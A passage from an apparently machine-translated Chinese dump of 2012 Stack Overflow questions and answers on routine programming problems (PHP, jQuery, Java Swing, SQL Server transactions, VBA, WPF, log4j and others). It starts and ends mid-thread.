通常你会将数据库封装在一些名为“DBConnection”或类似的类中。这个实例应该将真正的 $mysqli 对象作为[单例来管理](http://en.wikipedia.org/wiki/Singleton_pattern)

（非常）简短：

```
class Config
{
    public $host = 'localhost';
    [...]
    public static  $connectionObj 
    public static getConnection(){
      if (!isset($this->connectionObj ){
        $connectionObj = new mysqli($this->host, $config->this, $config->this, $this->database);
        if($mysqli->connect_error){
          report_error($mysqli);
        }
      }
      return $this->connectionObj;
    }
} 
```

您可以从任何地方访问此对象：

```
$mysqlObj = Config.getConnection() 
```

**免责声明：** 这是非常短的，未经测试的代码和数据库不应该进入配置类，而是它自己的数据库类，所有 SQL 函数作为方法，这只是为了重用您提供的代码*

# javascript - 使用鼠标滚轮滚动元素时传播的事件是什么？

> ID：11243722
> 
> 赞同：0
> 
> 时间：2012-06-28T11:35:12.043
> 
> 标签：javascript, jquery

我试图阻止滚动效果传播过去某个元素，我知道该怎么做，但似乎传播的不是鼠标滚轮事件，而是其他一些事件。知道是哪一个吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:06:20.340

您可以在 jQuery 中尝试：

```
$(window).scroll(function(event){
    window.scrollTo(0,0);
}); 
```

此外，还有插件：[https ://raw.github.com/brandonaaron/jquery-mousewheel/master/jquery.mousewheel.js](https://raw.github.com/brandonaaron/jquery-mousewheel/master/jquery.mousewheel.js)

这是一个使用示例：http: [//jsbin.com/ixura3/3](http://jsbin.com/ixura3/3)

但是，我建议您避免使用这些方法，因为滚动是默认功能，如果您的网站突然中断这种行为，用户可能会生气。

# java - Java将ImageIcon添加到JLabel

> ID：11243724
> 
> 赞同：8
> 
> 时间：2012-06-28T11:35:17.713
> 
> 标签：java, swing, jframe, jpanel, imageicon

我正在尝试使用 Java 制作一个非常基本的游戏，但无法在`JFrame`. 它过去对我有用，但现在不行，我看不出我做错了什么。

我已经尝试打印当前工作目录并更改我的图像以匹配它。问题很可能是没有获取图像，因为我的（文件查找器或文件阅读器或类似的东西）可以毫无问题地找到它，但我无法正确地将它（`ImageIcon`）添加到`JLabel`，或者添加到`JFrame`.

这是我的代码...

```
JFrame frame = new JFrame("no image");
ImageIcon image = new ImageIcon("C:/Documents and Settings/user/Desktop/hi/xD/JavaApplication2/image.png");
JLabel imagelabel = new JLabel(image);
frame.add(imagelabel); 
```

`JFrame`已经`setVisible(true)`和`pack()`。_

有人可以帮我理解什么是错的。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-28T11:41:25.060

你的问题出在这里：

```
 ImageIcon image = new ImageIcon("C:/Documents and Settings/user/Desktop/hi/xD/JavaApplication2/image.png");
   JLabel imagelabel = new JLabel(character); 
```

您创建了一个 ImageIcon“图像”，但您使用“字符”创建了 JLabel。

它应该是：

```
JLabel imagelabel = new JLabel(image); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:42:13.433

尝试，

```
ImageIcon image = new ImageIcon("c:\\path\\image.png");
imagelabel = new JLabel(character, image, JLabel.CENTER);
frame.add(imagelabel); 
```

看看教程 -[如何使用图标](http://docs.oracle.com/javase/tutorial/uiswing/components/icon.html)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2015-04-29T05:55:18.997

```
import javax.awt.*; 
import java.awt.*; 
import java.awt.event*; 

//class name image 
class image { 
    image() 
    //constructor { 
        Frame f=new Frame("Image"); 
        //Frame
        f.setSize(500,500); 
        f.setVisible(true); 
        Panel p =new Panel(); 
        //Panel 
        f.add(p); 
        p.addLayout(null); 
        ImageIcon ii=new ImageIcon("set your image path"); 
        //ImageIcon is used to image Display . 
        Label l =new Label(ii); 
        p.add(ii); 
        p.setBounds(set you bounds); 
        //Like that(20,20,500,40); 
    } 

    public static void main(String [] args) { 
        image obj = new 
    } 
} 
```

# php - 当已经存在同名的 Child 时，如何将新的 Child 添加到 SimpleXML？

> ID：11243734
> 
> 赞同：0
> 
> 时间：2012-06-28T11:35:56.437
> 
> 标签：php, simplexml

我正在尝试将一个子元素添加到一个简单的 XML 对象，但是当该级别上已经存在具有相同名称的元素时，它不会被添加。

这是我正在尝试的：

```
$str = '<?xml version="1.0"?>
    <root>
        <items>
            <item></item>
        </items>
    </root>';

$xml = new SimpleXMLElement($str);
$xml->addChild('items');
print $xml->asXML(); 
```

当我真正想要的是第二个空项目元素时，我得到了与开始时完全相同的 xml。如果我使用另一个元素名称而不是添加它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:54:13.743

使用此代码在您的示例中添加新项目节点：

```
$str = '<?xml version="1.0"?>
<root>
    <items>
        <item></item>
    </items>
</root>';

$xml = new SimpleXMLElement($str);
$xml->addChild('items', '');
var_dump($xml->asXML()); 
```

哪个输出：

```
string '<?xml version="1.0"?>
<root>
    <items>
        <item/>
    </items>
<items></items></root>
' (length=109) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T12:02:07.567

你可以`simpleloadxml`用作替代品

```
$xml = simplexml_load_file("myxml.xml");
$sxe = new SimpleXMLElement($xml->asXML());
$itemsNode = $sxe->items[0];
$itemsNode->addChild("item", $newValue);
$sxe->asXML("myxml.xml"); 
```

# python - 在 python 上获取 matlab 代码的结果

> ID：11243736
> 
> 赞同：-2
> 
> 时间：2012-06-28T11:35:57.310
> 
> 标签：python, matlab, file-io

我在 matlab 中有代码，我想在 python 代码中使用其结果（作为矩阵或 .dat 文件）。谁能告诉我如何做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T12:01:09.683

NumPy 和 SciPy 可以直接使用和读写 MATLAB [.mat](http://www.mathworks.co.uk/help/techdoc/ref/save.html)文件。[`scipy.io.loadmat`](http://docs.scipy.org/doc/scipy/reference/generated/scipy.io.loadmat.html)[`scipy.io.savemat`](http://docs.scipy.org/doc/scipy/reference/generated/scipy.io.savemat.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:39:44.747

.dat 文件只是一个文本文件：

```
fid = fopen('outputFile.dat', 'wt');
fprintf(fid, your_data_in_string_format);
fclose(fid); 
```

# sql-server - 在 VB.net 和 SQL Server 2008 中开始事务

> ID：11243737
> 
> 赞同：1
> 
> 时间：2012-06-28T11:35:59.727
> 
> 标签：sql-server, vb.net, sql-server-2008, transactionscope

我在 vb.net 中开始交易。我在 SQL Server 2008 上执行了一个存储过程。该存储过程包含`BEGIN TRANSACTION`. 它失败了，并且`ROLLBACK`在`CATCH`块运行中......

```
BEGIN CATCH

    IF @@TRANCOUNT > 1 ROLLBACK
        EXEC p_RethrowError

END CATCH 
```

Rethrow 有效地执行了“raiserror”。

执行传回 vb.net。“Catch sqlException”中的回滚执行。

问题：

*   为什么是`@@TRANCOUNT`1 而不是 2？（即为什么`begin trans`不包括在 vb.net 中？）

*   为什么`ROLLBACK`在 SQL 中也不回滚客户端传输（但在客户端回滚确实回滚 SQL Server）？

最后，在 vb.net 中，如果您尝试在客户端内两次回滚事务，则会收到异常“事务已完成”。是否知道交易是否已完成或仍在等待中？谢谢。

------------ VB.Net代码

```
Public Sub sub1(ByVal intID As Integer,  ByVal intValue as integer, ByVal intAuditUser As Int16)

Dim objConn As New SqlConnection(GetDBaseConnectionString())

    objConn.Open()

    '***** start the transaction ************************************************'
    Dim objTrans As SqlTransaction = objConn.BeginTransaction()

    Try

        Call sub2(objTrans, intID, intValue, intAuditUser)

        '***** commit the transaction ************************************************'
        objTrans.Commit()

    Catch es As SqlException
        objTrans.Rollback()
        Throw es

    Catch ex As Exception
        '***** rollback the transaction ************************************************'
        objTrans.Rollback()
        Throw ex

    Finally
        If objConn.State <> ConnectionState.Closed Then objConn.Close()
    End Try

End Sub

Private Sub Sub2(ByVal objTrans As SqlTransaction, ByVal intID As Integer, ByVal intValue as integer, ByVal intAuditUser As Int16)

    Dim objParams As New List(Of SqlParameter)

        SqlHelper.AddInParameter(objParams, "ID", SqlDbType.Int, intID)
        SqlHelper.AddInParameter(objParams, "Value", SqlDbType.Int, intValue)
        SqlHelper.AddInParameter(objParams, "AuditUser", SqlDbType.SmallInt, intAuditUser)

        '* save details'
        SqlHelper.ExecuteNonQuery(objTrans, CommandType.StoredProcedure, "p_StoredProc_UpdateSomething", objParams.ToArray)

End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-29T22:51:55.710

> 为什么@@TRANCOUNT 是 1 而不是 2？（即为什么不包括 vb.net 中的 begin trans ？）

它是 2。这就是它的[记录](http://msdn.microsoft.com/en-us/library/ms188929.aspx)方式，如果它不是 2，则服务器端`ROLLBACK`将不会执行。

> 为什么 SQL 中的 ROLLBACK 也不回滚客户端传输（但客户端中的回滚确实回滚 SQL Server）？

没有单独的客户端事务。它是所有相同的服务器端事务，并且无论当前的@@TRANCOUNT 值如何，也无论在何处启动回滚，它`ROLLBACK`总是[回滚事务。](http://msdn.microsoft.com/en-us/library/ms181299.aspx)

> 最后，在 vb.net 中，如果您尝试在客户端内两次回滚事务，则会收到异常“事务已完成”。

的实现`SqlTransaction.Rollback`非常复杂，对于僵尸事务，pre-SQL Server 2005 和 post-SQL Server 2005 有不同的路径，例如原始的 pre-2005 路径执行一个简单的`Rollback`调用，因此：

```
IF @@TRANCOUNT > 0 ROLLBACK TRANSACTION 
```

...并且`SqlTransaction`客户端对象还进入僵尸模式，这就是为什么您在随后尝试再次`ROLLBACK`在同一对象上执行后看到错误的原因。`SqlTransaction`

SQL Server 2008 上的代码路径类似，只是它不再基于人类可读的 SQL。

这解释了为什么您只会在第二次和后续调用时收到错误`SqlTransaction.Rollback`，即使回滚已经在存储过程中不可撤销地启动。

> 是否知道交易是否已完成或仍在等待中？

是的。方法见[这里](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqltransaction.connection.aspx)：

> 获取与事务关联的 SqlConnection 对象，如果事务不再有效，则为 null。

因此，如果可以这样测试：

```
if (myTransaction.Connection != null) ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T16:49:41.570

嘿克里斯克里斯医生，

诚然，这与您最初的问题没有太大关系。但是，在阅读了您关于如何在 vb.net 中开始交易的评论之后。这可能会有所帮助：

```
Dim sqlUpdate As New StringBuilder 'use this to build your insert/update statements
sqlUpdate.Append("SQLCODE")
Dim cnADO As SqlClient.SqlConnection = yourDataBaseStuff.getConnection("targetServer", cnADO)
Dim trans As SqlTransaction = Nothing
Dim sqlCmdUpdate As New SqlCommand(sqlUpdate.ToString, cnADO)
sqlCmdUpdate.Parameters.AddWithValue("@X", new_x) 'where @X is your stored procedure variable, and new_x is what you would like to pass in

' Build Transaction, associate commands
trans = cnADO.BeginTransaction
cmdLoad.Transaction = trans
cmdLoad.CommandText = "Transaction stuff"
cmdLoad.ExecuteNonQuery()
sqlCmdUpdate.Transaction = trans
sqlCmdUpdate.ExecuteNonQuery()
trans.Commit() 
```

希望这能让你朝着更好的方向开始！

-sf

# svg - 有 SVG 到 VML 的转换工具吗？离线或在线。（不是在飞行中）

> ID：11243738
> 
> 赞同：4
> 
> 时间：2012-06-28T11:36:00.913
> 
> 标签：svg, vml

我一直在寻找将 SVG 文件转换为 Internet Explorer 可读的 VML 的工具。

我找到了几个“即时”解决方案，但这些都是不必要的，因为我们只希望在一些简单、不变但可缩放的图形上使用矢量图形。

是否有任何离线或在线工具可以接受 SVG 文件并输出 VML 代码？

亲切的问候。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:42:54.010

我从未使用过它，但我的理解是这可以获取 SVG 文件并输出 VML（反之亦然）。

[http://vectorconverter.sourceforge.net/](http://vectorconverter.sourceforge.net/)

查看文档，您似乎只需将其安装在您的服务器上并上传您的 SVG 文件。有一个命令行工具可用于指定输出文件。然后，您可以下载该新创建的 VML 文件（如果它不能完美地在转换过程中幸存下来，则手动对其进行一些调整）。

# excel - 为什么这个 VBA 代码是错误的，我该如何修复/避免？

> ID：11243739
> 
> 赞同：0
> 
> 时间：2012-06-28T11:36:01.927
> 
> 标签：excel, vba

我目前有这个代码

```
 Private Sub Worksheet_Change(ByVal Target As Range)
    WorksheetChanged(Target, Range("AB3").CurrentRegion, Range("B18:B19"))
    WorksheetChanged(Target, Range("AE3").CurrentRegion, Range("B20:B21"))
End Sub 
```

但它给我一个“编译错误：预期 =”，我不知道为什么，我不知道 = 会去哪里，有什么帮助吗？先感谢您。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:41:29.223

如果要使用括号，则需要分配给变量，或者在某些情况下，使用调用，如果不需要分配，请跳过括号：

```
WorksheetChanged Target, Range("AB3").CurrentRegion, Range("B18:B19") 
```

# facebook - 如何让 Facebook 的like 按钮窄于 225px？

> ID：11243742
> 
> 赞同：1
> 
> 时间：2012-05-16T16:23:40.837
> 
> 标签：facebook

[我正在通过https://developers.facebook.com/docs/reference/plugins/like/](https://developers.facebook.com/docs/reference/plugins/like/)为我的网站生成一个带有 Facebook 的“标准”布局的赞按钮。我已将其宽度设置为 200 像素，但请注意将其设置为低于 225 像素没有任何效果，并且该页面上的文档确实将 225 像素指定为标准布局的最小宽度。不幸的是，我需要将其设置为 200 像素宽以适合我的网站设计。有没有办法强制它进入这个宽度？

（该站点位于[http://gwwc2.centreforeffectivealtruism.org/](http://gwwc2.centreforeffectivealtruism.org/)，如果您想玩 Firebug，尽管类似按钮是由 javascript 生成的，因此您可能必须复制该页面并编辑其源代码。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T20:40:47.270

宽度限制的原因是显示给未登录用户的文本。

***您会发现，如果您将该***按钮样式缩小到低于 225 像素，一些用户会发现您的布局被打乱（我已经尝试过，结果并不好）。

但是，您可以选择不同的按钮样式。

*   取消选中发送按钮选项
*   选择 button_count 选项
*   将宽度设置为 200px
*   取消选中显示面孔

你会得到这个：-

```
<div class="fb-like" data-href="http://www.example.com" data-send="false" data-layout="button_count" data-width="200" data-show-faces="false" data-font="arial"></div> 
```

适合您的宽度要求。使用 box_count 也可以很好地工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-16T18:05:56.127

`&width=225`在 iFrame属性中取出，`src`完全不传递宽度。在 iframe`style`属性中，指定一个 css 值`width:200px;`如果您传递的值小于源 URL 中的最小值，facebook 将忽略它，但如果您自定义 iframe 本身的样式为该宽度，则内容将挤在里面。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T02:45:21.103

创建一个声明的 CSS 规则`iframe { width:200px !important; )`

我会针对您的 Facebook 小部件所在的任何 DIV 或容器制定该规则。当然，如果你这样做后看起来很糟糕，你可以把它拿出来。但如果你只是包含一个“喜欢”按钮（没有面孔），它应该可以工作。

# jquery - 手风琴 jquery ui，没有完全打开并且通常有问题

> ID：11243746
> 
> 赞同：0
> 
> 时间：2012-06-28T11:36:21.367
> 
> 标签：jquery, accordion

我有一个 jquery ui 手风琴，这是我在这里帮助开发的，大多数都可以正常工作，但是当你鼠标进出几次时它会卡住，请参见下面的屏幕截图：

[菜单错误 http://jsfiddle.net/AJBweb1986/mZnv8/4/](http://jsfiddle.net/AJBweb1986/mZnv8/4/)

这是小提琴：[小提琴](http://jsfiddle.net/AJBweb1986/mZnv8/4/)

![在此处输入图像描述](../Images/de63bec01a31223d7d16632aafe64975.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:50:55.647

我希望它会工作

请参阅[http://jsfiddle.net/ipsjolly/mjHSJ/](http://jsfiddle.net/ipsjolly/mjHSJ/) 它现在可以正常工作，没有任何卡住...

**替换了这个**

```
$(function() {
    $( "#accordion" ).accordion({
        event: 'click',
        collapsible: true,
        active: false,
        autoHeight: false,
        icons: {
            "header": "closedacc",
            "headerSelected": "openacc"
        }
    }).on('mouseleave', function() {
        $(this).accordion( "option", "active", false );
    }).children('li').on('mouseenter', function() {
        $(this).find('h3').trigger('click');
    });

}); 
```

​</p>

**有了这个**

```
$(function() {
    $( "#accordion" ).accordion({
        event: 'click',
        collapsible: true,
        active: false,
        autoHeight: false,
        icons: {
            "header": "closedacc",
            "headerSelected": "openacc"
        }
    }).children('li').on('mouseenter', function() {
        $(this).find('h3').trigger('click');
    });

});
​ 
```

实际上，我认为`mouseleave`事件`mouseenter`正在造成某种瓶颈情况，所以我删除了一个：P

# c# - 检查在 MS Word 中单击了哪个字段

> ID：11243752
> 
> 赞同：2
> 
> 时间：2012-06-28T11:37:03.317
> 
> 标签：c#, ms-word, vsto

我需要在单击字段后显示的 Word 中的右键菜单中添加一个命令。那不是问题：

```
var ContextMenu = this.Application.CommandBars["Fields"];
button = (Office.CommandBarButton)ContextMenu.Controls.Add(1);
button.Click += new Office._CommandBarButtonEvents_ClickEventHandler(button_Click); 
```

现在我需要点击字段用户。我试过这个：

```
void button_Click(Office.CommandBarButton Ctrl, ref bool cancel)
{
    var currentSelection = Globals.ThisAddIn.Application.ActiveWindow.Selection;
    if (currentSelection.Fields.Count > 0)
        var field = currentSelection.Fields[1]
    //Do some stuff with the field
} 
```

但它仅在选择该字段时才有效，例如当用户只是右键单击它而不选择任何内容或仅选择显示文本的部分字段时，它将不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T13:21:52.700

您可以通过检查 currentSelection.Range.Paragrahs[1].Fields 来显着减少迭代的字段数量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-29T15:43:35.077

我想出了这个解决方案，但仍在寻找不必遍历文档中所有字段的东西：

```
 public static IEnumerable<Field> GetAllFieldsInSelection(this Selection selection)
    {
        foreach (Field f in selection.Document.Fields)
        {
            int fieldStart = f.Code.FormattedText.Start;
            int fieldEnd = f.Code.FormattedText.End + f.Result.Text.Count();//field code + displayed text lenght

            if (!((fieldStart < selection.Start) & (fieldEnd < selection.Start) |
                  (fieldStart > selection.End) & (fieldEnd > selection.End)))
            {
                yield return f;
            }
        }
    } 
```

# c# - 带有 vb.net 的 URL 中的随机字符

> ID：11243755
> 
> 赞同：0
> 
> 时间：2012-06-28T11:37:15.110
> 
> 标签：c#, vb.net, loops, random, webrequest

我正在做一个 webrequest，需要在每个 url 请求中输入静态 + 随机字符（数字和字母）：

```
Dim postData1 As String = "http://www.xxx.com/......" & rdm & "xxxyyyzzz.htm"
Dim postReq1 As HttpWebRequest = DirectCast(WebRequest.Create(postData2), HttpWebRequest)

Dim postData2 As String = "http://www.xxx.com/......" & rdm & "xxxyyyzzz.htm"
Dim postReq2 As HttpWebRequest = DirectCast(WebRequest.Create(postData2), HttpWebRequest)

etc 
```

请求（总共 6 个）不断循环。这是我随机使用的代码：

```
Dim chars = "abcdefghijklmnopqrstuvwxyz0123456789"
            Dim random = New Random()
            Dim result = New String(Enumerable.Repeat(chars, 3).[Select](Function(s) s(random.[Next](s.Length))).ToArray())

            Dim rdmpart = "x1y2z3"
            rdm = rdmpart & result 
```

我需要一系列 url 循环并在每个请求上生成一个新的 rdm。这怎么可能？每当我调用“rdm”时，它都会给我相同的响应。提前致谢。

* * *

这是解决方案：

终于成功了！这让我发疯了:)根据弗里托的回答，这就是我所做的：

```
Public Shared Function rdm() As String

        Static random As New Random()
        Dim chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        Dim result = New String(Enumerable.Repeat(chars, 3).[Select](Function(s) s(random.[Next](s.Length))).ToArray())

        Dim rdmpart = "x1y2z3"
        rdm = rdmpart & result

    End Function 
```

并用简单的“rdm()”调用是的！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:01:05.193

试试这个：</p>

随机使用同一时间的种子。

所以，只使用一个随机对象并初始化一次。

对不起，我的英语不好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T12:40:27.473

我对VB很生疏，但你可能想尝试这样的事情......

```
Public Class CustomRandomGenerator

    Private Shared myRandom as New Random()

    Public Shared Function GenerateRandomString() As String

        Dim chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        Dim result = New String(Enumerable.Repeat(chars, 3).[Select](Function(s) s(random.[Next](s.Length))).ToArray())

        Dim rdmpart = "x1y2z3"
        rdm = rdmpart & result

        Return result
    End Function

End Class 
```

“Private Shared myRandom as New Random()”主要是您要寻找的。正如“Chachi”试图解释的那样，你**只需要一个**随机发生器。这是因为 Random 对象是一个函数，它在其“Next()”调用中提供 sudo-random 值。当您调用 Random 构造函数时，它使用系统当前时间为其内部函数提供种子值。

根据您使用的 .Net 版本，Random() 构造函数将始终使用系统时间**或**“0”作为种子。如果每次运行代码时总是得到相同的结果，那么将“New Random()”部分更改为“New Random(System.DateTime.Now.Ticks)”之类的内容，你应该会很好。:-)

最后，您将使用“CustomRandomGenerator.GenerateRandomString()”在代码中调用它。我认为如果您不熟悉“共享”方法/变量，可能需要提及。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T12:00:33.270

我认为你的问题是你`New Random()`每次想要生成一个随机 URL 时都在创建一个，这不是使用它的正确方法（它使用当前时间作为种子，所以如果你的代码运行得足够快，它每次都会生成相同的随机数序列）。这是一个应该有效的示例：

```
Sub Main()
    Dim chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    Dim random = New Random()

    For i = 0 To 10
        Dim result = New String(Enumerable.Repeat(chars, 3).[Select](Function(s) s(random.[Next](s.Length))).ToArray())
        Dim rdmpart = "x1y2z3"
        Dim rdm = rdmpart & result

        Dim postData As String = "http://www.xxx.com/......" & rdm & "xxxyyyzzz.htm"
        Dim postReq As HttpWebRequest = DirectCast(WebRequest.Create(postData), HttpWebRequest)
    Next
End Sub 
```

# c# - 哪种方式更好或更正确，为什么？

> ID：11243757
> 
> 赞同：0
> 
> 时间：2012-06-28T11:37:19.057
> 
> 标签：c#, wpf, templates

在 WPF 中有很多方法可以实现相同的目标。在这个例子中哪个更好？

```
<ItemsControl>
    <ItemsControl.Template>
        <ControlTemplate>
            <ScrollViewer>
                <ItemsPresenter />
            </ScrollViewer>
        </ControlTemplate>
    </ItemsControl.Template>
</ItemsControl> 
```

或者

```
<ScrollViewer>
    <ItemsControl />
</ScrollViewer> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T13:31:30.623

这将是一个更好的解决方案

```
<ItemsControl>
    <ItemsControl.Template>
        <ControlTemplate>
            <ScrollViewer CanContentScroll="True">
                <StackPanel IsItemsHost="True" />
            </ScrollViewer>
        </ControlTemplate> 
    </ItemsControl.Template>
</ItemsControl> 
```

这是因为与`ItemsControl`or不同`ItemsPresenter`，它`StackPanel`支持`IScrollInfo`界面，因此您可以对项目的滚动方式施加更多控制。

[http://msdn.microsoft.com/en-us/library/system.windows.controls.primitives.iscrollinfo.aspx](http://msdn.microsoft.com/en-us/library/system.windows.controls.primitives.iscrollinfo.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-02T08:08:14.353

在您真正需要模板之前，不要使用模板。=)

也就是说，我个人的经验法则是，如果我重复相同的工作超过两次（即三次及以上），我可能需要模板或实施一些其他可爱的 DRY 原则。

# iphone - iOS4是否支持单向？

> ID：11243762
> 
> 赞同：0
> 
> 时间：2012-06-28T11:37:27.120
> 
> 标签：iphone, objective-c, ios, automatic-ref-counting, oneway

看这篇文章： [http ://www.galloway.me.uk/tutorials/singleton-classes/](http://www.galloway.me.uk/tutorials/singleton-classes/)

我已经实现了一个单例，我的问题是 iOS 4.0 是否支持单向（不使用 ARC）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:39:50.477

是的，它是可用的，oneway 是一个客观的 c 关键字，它与给定的 iOS SDK 无关

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:41:21.047

这是一种设计模式，随着技术的变化将保持不变。因此，您可以轻松使用它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T11:42:51.630

是的，`oneway`关键字是编译器提示。

# java - 如何用数字自动填充二维数组

> ID：11243774
> 
> 赞同：4
> 
> 时间：2012-06-28T11:37:50.373
> 
> 标签：java, arrays

您好我正在尝试根据用户输入自动填充二维数组。用户将输入 1 个数字，该数字将设置 2d 数组的大小。然后我想打印出数组的数字。例如，如果用户输入数字 4。二维数组将是 4 行 x 4 列，应该包含数字 1 到 16，并打印如下。

```
1-2-3-4
5-6-7-8
9-10-11-12
13-14-15-16 
```

但我正在努力想出正确的声明来做到这一点。目前我的代码只是打印出一个包含 *.

有没有人知道如何打印出这些数字，我真的很困惑。我的代码如下：

```
public static void main(String args[]){

    Scanner input = new Scanner(System.in);
    System.out.println("Enter room length");

    int num1 = input.nextInt();
    int num2 = num1;
    int length = num1 * num2;
    System.out.println("room "+num1+"x"+num2+"="+length);

    int[][] grid = new int[num1][num2];

    for(int row=0;row<grid.length;row++){   
        for(int col=0;col<grid[row].length;col++){
            System.out.print("*");  
        }
        System.out.println();
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:42:46.917

读取 n 值，

```
int[][] arr = new int[n][n];
int inc=1;
for(int i=0;i<n;i++)
for(int j=0;j<n;j++)
{
arr[i][j]=inc;
inc++;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:40:16.040

好吧，首先你必须用数字填充数组。您可以为此使用双 for 循环和一个计数器变量，您可以在内部 for 循环的每个循环之后递增该变量。

```
int counter = 1;
for(int x = 0; x < num1; x++)
{
    for(int y = 0; y < num2; y++)
    {
        grid[x][y] = counter++;
    }
} 
```

之后，您可以使用双 for 循环再次输出数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:42:38.563

我不确定我是否理解正确。您的代码打印有问题 *？

如果是，那么原因就是这个

```
System.out.print("*"); 
```

应该

```
System.out.print(grid[row]); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T11:53:33.640

```
public static void main(String[] args) {

    Scanner input = new Scanner(System.in);
    System.out.println("Enter room length");
    int arraySize = input.nextInt();
    System.out.println("Length: " + (arraySize*arraySize));

    int[][] array = new int[arraySize][arraySize];
    int count = 1;

    for (int i=0;i<arraySize;i++) {
        for (int j=0;j<arraySize;j++) {
            array[i][j] = count;
            if (j != (arraySize-1)) 
                System.out.print(count + "-");
            else
                System.out.println(count);
            count++;
        }
    }
} 
```

此代码应按您想要的方式打印出数字。

# php - jquery 自动完成点击事件

> ID：11243775
> 
> 赞同：0
> 
> 时间：2012-06-28T11:37:52.330
> 
> 标签：php, jquery

```
<div id="display">
    <div align="left" class="display_box">
        <a class="test" href="#">
            <img style="width:25px; float:left; margin-right:6px" src="user_img/gow.jpg">
        </a>
        <input type="hidden" id="uid" value="3">
        <b>b</b>ack&nbsp;<b>b</b>ack<br>
        <span style="font-size:9px; color:#999999">back</span>
    </div>
    <div align="left" class="display_box">
        <a class="test" href="#">
            <img style="width:25px; float:left; margin-right:6px" src="user_img/gow.jpg">
        </a>
        <input type="hidden" id="uid" value="3">
        <b>b</b>ack&nbsp;<b>b</b>ack<br>
        <span style="font-size:9px; color:#999999">back</span>
    </div>
</div> 
```

我正在使用 facebook 等缩略图中的图像制作此自动完成搜索功能，并在 ajax 调用后将其作为 html 获取。我想要做的是，如果用户单击具有类 display_box 的任何 div，我想获取 div 中隐藏字段的值...

我尝试了此代码，但如果我使用#display click 事件捕获但它不会捕获单击事件，但这是针对整个 div 的。

```
$('.display_box').click(function() {
    var id =$(this).find('input[type=hidden]').val();
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:50:51.310

确保您正在添加 jQuery 文件并且 $ 没有冲突。您可以在编写 js 代码之前使用此行。

```
$ = jQuery.noConflict(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:52:03.090

您的代码似乎有效。看看这个小提琴[http://jsfiddle.net/3JK4c/](http://jsfiddle.net/3JK4c/)

您是否将代码放入文档就绪函数中？

```
$(document).ready(function() {
    .... code here ....
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:52:49.250

终于发现了问题，实际上它是将点击事件与显示框绑定，但是当程序最初运行或直到你搜索时不存在显示框，所以我所做的是我在成功调用 ajax 时绑定了点击事件，现在它可以工作了。 ..我希望它有所帮助。实际上，当用户搜索来自数据库的内容时，这些 div display_box 是动态生成的，这里是帮助任何人的完整代码

```
 $.ajax({
              type: "POST",
             url: "search.php",
             data: dataString,
             cache: false,
             success: function(html)
           {

            if(html !="")
            {
            $("#display").html(html).show();

    $('.display_box').click(function(){

$('#temp').val($(this).find('input[type=hidden]').val());
    $('#searchbox').val($(this).find('.name').text());
    $('#display').fadeOut('slow');

    });
           }
      }

            }); 
```

# java - log4j 属性：LevelMatchFilter 不起作用

> ID：11243778
> 
> 赞同：6
> 
> 时间：2012-06-28T11:37:57.013
> 
> 标签：java, logging, properties, log4j

我试图将我的日志记录路由到两个不同的文件：一个用于 INFO 消息，另一个用于 ERROR。LevelMatchFilter 似乎是正确的方法。不幸的是，所有消息都记录到我的 info.log 中，而不仅仅是 INFO 消息。任何想法我做错了什么？

这是我的配置：

```
# Define the root logger with appender file
log4j.logger.com.my.class.ClassName=DEBUG, FILE, ERR, CA

# Define the info file appender
log4j.appender.FILE=org.apache.log4j.FileAppender
log4j.appender.FILE.File=info.log
log4j.appender.FILE.filter.a=org.apache.log4j.varia.LevelMatchFilter
log4j.appender.FILE.filter.a.LevelToMatch=INFO
log4j.appender.FILE.filter.a.AcceptOnMatch=true

# Define the layout for info file appender
log4j.appender.FILE.layout=org.apache.log4j.PatternLayout
log4j.appender.FILE.layout.conversionPattern=%d %-5p %c - %m%n

# Define the error file appender
log4j.appender.ERR=org.apache.log4j.FileAppender
log4j.appender.ERR.File=error.log
log4j.appender.ERR.Threshold=ERROR

# Define the layout for error file appender
log4j.appender.ERR.layout=org.apache.log4j.PatternLayout
